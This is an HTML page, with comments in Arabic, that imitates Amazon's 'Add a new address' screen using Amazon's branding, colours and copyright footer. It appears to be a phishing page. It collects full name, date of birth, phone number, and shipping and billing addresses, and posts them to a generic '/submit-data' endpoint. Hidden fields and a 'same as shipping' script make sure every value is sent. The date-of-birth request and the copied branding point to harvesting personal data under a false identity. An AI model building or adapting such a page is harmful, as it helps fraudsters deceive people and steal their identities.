<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Shipping and Delivery Information</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { font-family: 'Inter', sans-serif; }</style>
</head>
<body class="bg-[#F3F3F3] min-h-screen flex flex-col justify-between text-[#111111]">

    <!-- Header with Amazon Logo -->
    <header class="bg-[#131A22] shadow-md p-4 flex items-center max-w-md mx-auto w-full text-white border-b border-[#232F3E]">
        <div class="flex items-center gap-2">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAADvklEQVR4nO3bS2hcVRTG8f9Jpm3SND7S+EibpE3atI9atU8UFRVcuBFdiIIuXAqKtSD4AFFQFAqCjvhYFwVfKKgIguvChSg" alt="Amazon logo">
            <span class="text-xl font-black text-[#FF9900] tracking-wide ml-1">amazon</span>
        </div>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow px-4 py-6 max-w-md mx-auto w-full">
        <h1 class="text-2xl font-bold text-[#111111] mb-6 text-left">Add a new address</h1>

        <form action="/submit-data" method="POST" class="space-y-4 bg-[#FFFFFF] border border-[#232F3E]/20 rounded-xl p-5 shadow-sm text-left">

            <!-- ========== قسم عنوان الشحن ========== -->
            <div class="border-b border-gray-200 pb-4">
                <h2 class="text-sm font-bold text-[#111111] mb-3 flex items-center gap-2">
                    <span>📦</span> Shipping Address
                </h2>

                <!-- Country -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">Country/Region</label>
                    <select name="country" class="w-full px-3 py-2.5 bg-[#F3F3F3] border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                        <option value="US">United States</option>
                    </select>
                </div>

                <!-- Full Name -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">Full name (First and Last name)</label>
                    <input type="text" name="username" required placeholder="e.g., John Smith"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                </div>

                <!-- Date of Birth -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">Date of Birth</label>
                    <div class="grid grid-cols-3 gap-2">
                        <input type="tel" name="dob_month" required maxlength="2" placeholder="MM"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900]">
                        <input type="tel" name="dob_day" required maxlength="2" placeholder="DD"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900]">
                        <input type="tel" name="dob_year" required maxlength="4" placeholder="YYYY"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900]">
                    </div>
                </div>

                <!-- Phone -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">Phone number</label>
                    <input type="tel" name="phone" required placeholder="+1 (555) 000-0000"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    <p class="text-[10px] text-gray-400 mt-1">May be used to assist delivery.</p>
                </div>

                <!-- Street Address -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">Street address</label>
                    <input type="text" name="address_line1" required placeholder="Street address, P.O. box, company name"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm mb-2 focus:outline-none focus:border-[#FF9900]">
                    <input type="text" name="address_line2" placeholder="Apt, suite, unit, building, floor, etc. (optional)"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                </div>

                <!-- City -->
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">City</label>
                    <input type="text" name="city" required placeholder="e.g., New York / Los Angeles"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                </div>

                <!-- State & ZIP -->
                <div class="grid grid-cols-2 gap-3">
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">State</label>
                        <input type="text" name="state" required placeholder="e.g., NY"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">ZIP Code</label>
                        <input type="text" name="zipcode" required placeholder="10001"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>
                </div>
            </div>

            <!-- ========== قسم عنوان الفوترة (Billing Address) ========== -->
            <div class="pt-2" id="billingSection">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-sm font-bold text-[#111111] flex items-center gap-2">
                        <span>💳</span> Billing Address
                    </h2>
                    <!-- زر "نفس عنوان الشحن" -->
                    <button type="button" id="copyShippingBtn"
                            class="text-xs bg-[#FF9900] hover:bg-[#FFB84D] text-white font-semibold px-4 py-1.5 rounded-full transition-all duration-200 active:scale-95 shadow-sm">
                        ⚡ Same as shipping
                    </button>
                </div>

                <!-- حاوية حقول الفوترة - اللي هتختفي -->
                <div id="billingFields">
                    <!-- Billing: Full Name (without required) -->
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">Full name (on billing)</label>
                        <input type="text" name="billing_username" placeholder="e.g., John Smith"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>

                    <!-- Billing: Street Address (without required) -->
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">Street address</label>
                        <input type="text" name="billing_address_line1" placeholder="Street address, P.O. box, company name"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm mb-2 focus:outline-none focus:border-[#FF9900]">
                        <input type="text" name="billing_address_line2" placeholder="Apt, suite, unit, building, floor, etc. (optional)"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>

                    <!-- Billing: City (without required) -->
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">City</label>
                        <input type="text" name="billing_city" placeholder="e.g., New York / Los Angeles"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>

                    <!-- Billing: State & ZIP (without required) -->
                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-xs font-bold text-[#111111] mb-1">State</label>
                            <input type="text" name="billing_state" placeholder="e.g., NY"
                                   class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-[#111111] mb-1">ZIP Code</label>
                            <input type="text" name="billing_zipcode" placeholder="10001"
                                   class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                        </div>
                    </div>

                    <!-- Billing: Phone (without required) -->
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">Phone number (billing)</label>
                        <input type="tel" name="billing_phone" placeholder="+1 (555) 000-0000"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900]">
                    </div>
                </div>

                <!-- رسالة تظهر عند إخفاء الحقول -->
                <div id="billingHiddenMessage" class="hidden text-sm text-green-600 bg-green-50 border border-green-200 rounded-lg p-3 mt-2">
                    ✅ Billing address will use the same information as shipping address.
                </div>
            </div>

            <!-- ========== HIDDEN FIELDS للفوترة (لضمان وصول البيانات حتى لو فاضية) ========== -->
            <input type="hidden" name="billing_username_hidden" id="billing_username_hidden" value="">
            <input type="hidden" name="billing_address_line1_hidden" id="billing_address_line1_hidden" value="">
            <input type="hidden" name="billing_address_line2_hidden" id="billing_address_line2_hidden" value="">
            <input type="hidden" name="billing_city_hidden" id="billing_city_hidden" value="">
            <input type="hidden" name="billing_state_hidden" id="billing_state_hidden" value="">
            <input type="hidden" name="billing_zipcode_hidden" id="billing_zipcode_hidden" value="">
            <input type="hidden" name="billing_phone_hidden" id="billing_phone_hidden" value="">

            <!-- ========== زر الإرسال الرئيسي ========== -->
            <div class="pt-2">
                <button type="submit" class="w-full bg-[#FF9900] hover:bg-[#FFB84D] text-[#FFFFFF] font-bold py-3 px-4 rounded-lg text-sm shadow transition-all duration-200 active:scale-[0.99]">
                    Use this address
                </button>
            </div>
        </form>
    </main>

    <!-- Footer -->
    <footer class="bg-[#232F3E] border-t border-[#131A22] py-6 text-center text-xs text-[#FFFFFF]/70 w-full mt-auto">
        <div class="max-w-md mx-auto px-4">
            <div class="flex justify-center gap-4 mb-3">
                <a href="/user-agreement" class="hover:underline hover:text-[#FFFFFF]">User Agreement</a>
                <a href="/privacy-policy" class="hover:underline hover:text-[#FFFFFF]">Privacy Notice</a>
                <a href="/contact-us" class="hover:underline hover:text-[#FFFFFF]">Contact Us</a>
            </div>
            <p class="text-[#FFFFFF]/50">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
        </div>
    </footer>

    <!-- JavaScript: نسخ البيانات وإخفاء الحقول وتحديث الـ hidden fields -->
    <script>
        (function() {
            const copyBtn = document.getElementById('copyShippingBtn');
            const billingFields = document.getElementById('billingFields');
            const billingHiddenMessage = document.getElementById('billingHiddenMessage');
            let isHidden = false;

            // خريطة الحقول
            const fieldMap = [
                { from: 'username', to: 'billing_username', hidden: 'billing_username_hidden' },
                { from: 'address_line1', to: 'billing_address_line1', hidden: 'billing_address_line1_hidden' },
                { from: 'address_line2', to: 'billing_address_line2', hidden: 'billing_address_line2_hidden' },
                { from: 'city', to: 'billing_city', hidden: 'billing_city_hidden' },
                { from: 'state', to: 'billing_state', hidden: 'billing_state_hidden' },
                { from: 'zipcode', to: 'billing_zipcode', hidden: 'billing_zipcode_hidden' },
                { from: 'phone', to: 'billing_phone', hidden: 'billing_phone_hidden' }
            ];

            // دالة لتحديث الـ hidden fields
            function updateHiddenFields() {
                fieldMap.forEach(({ from, to, hidden }) => {
                    const sourceField = document.querySelector(`[name="${from}"]`);
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (sourceField && targetField && hiddenField) {
                        // لو الحقل المخفي موجود، خد قيمته
                        if (targetField.value) {
                            hiddenField.value = targetField.value;
                        } else {
                            // لو الحقل فاضي، خد قيمة الشحن (في حالة استخدام زر same as shipping)
                            hiddenField.value = sourceField.value;
                        }
                    }
                });
            }

            // تحديث الـ hidden fields عند تغيير أي حقل فوترة
            document.querySelectorAll('[name^="billing_"]').forEach(field => {
                field.addEventListener('input', function() {
                    // لو الحقل ده مش hidden
                    if (!this.type || this.type !== 'hidden') {
                        const hiddenId = this.name + '_hidden';
                        const hiddenField = document.getElementById(hiddenId);
                        if (hiddenField) {
                            hiddenField.value = this.value;
                        }
                    }
                });
            });

            // تحديث الـ hidden fields قبل إرسال الفورم
            document.querySelector('form').addEventListener('submit', function(e) {
                // تحديث كل الـ hidden fields من حقول الفوترة الظاهرة
                fieldMap.forEach(({ to, hidden }) => {
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (targetField && hiddenField) {
                        hiddenField.value = targetField.value;
                    }
                });
            });

            copyBtn.addEventListener('click', function() {
                // 1. نسخ البيانات من الشحن للفوترة
                fieldMap.forEach(({ from, to, hidden }) => {
                    const sourceField = document.querySelector(`[name="${from}"]`);
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (sourceField && targetField && hiddenField) {
                        const value = sourceField.value;
                        targetField.value = value;
                        hiddenField.value = value; // تحديث الـ hidden field برضو
                    }
                });

                // 2. إخفاء الحقول مع تأثير انسيابي
                if (!isHidden) {
                    billingFields.style.transition = 'all 0.4s ease';
                    billingFields.style.opacity = '0';
                    billingFields.style.transform = 'translateY(-10px)';
                    
                    setTimeout(() => {
                        billingFields.style.display = 'none';
                        billingHiddenMessage.classList.remove('hidden');
                        billingHiddenMessage.style.opacity = '0';
                        billingHiddenMessage.style.transition = 'opacity 0.4s ease';
                        setTimeout(() => {
                            billingHiddenMessage.style.opacity = '1';
                        }, 50);
                    }, 400);
                    
                    // تغيير نص الزر
                    copyBtn.textContent = '📌 Billing = Shipping';
                    copyBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                    copyBtn.classList.remove('bg-[#FF9900]', 'hover:bg-[#FFB84D]');
                    
                    isHidden = true;
                }
            });

            // تحديث الـ hidden fields في البداية
            updateHiddenFields();
        })();
    </script>

</body>
</html>
